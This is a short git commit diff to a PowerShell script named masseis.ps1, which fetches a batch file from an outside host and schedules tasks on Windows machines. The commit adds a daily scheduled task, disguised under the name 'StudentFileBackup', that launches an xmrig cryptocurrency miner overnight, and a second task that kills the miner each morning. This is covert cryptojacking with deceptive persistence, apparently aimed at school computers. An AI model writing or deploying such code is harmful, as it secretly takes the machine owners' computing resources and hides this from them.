2f04ed95dd1e6e5cd5f5b287addf2885c6859216
Lukas Does Dev <51633285+LukasDoesDev@users.noreply.github.com>
2021-02-27 11:46:19 +0200

    Update masseis.ps1

--- masseis.ps1
+++ masseis.ps1
@@ -29,4 +29,5 @@ iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat
 
 # schedule task
 echo "schedule task"
-schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 07:00 /k
+schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00
+schtasks /create /sc daily /tn RestrictStudent /tr "kill -Name xmrig -Force" /st 7:00
